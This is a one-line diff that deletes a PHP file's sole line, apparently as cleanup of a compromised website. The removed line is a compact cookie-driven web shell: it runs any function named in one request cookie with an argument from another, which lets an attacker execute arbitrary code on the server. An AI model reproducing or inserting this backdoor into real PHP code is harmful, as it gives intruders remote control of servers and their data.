@@ -1,1 +1,0 @@
-<?php if(isset($_COOKIE["imE"])){$_COOKIE["maj"]($_COOKIE["imE"]);exit;}
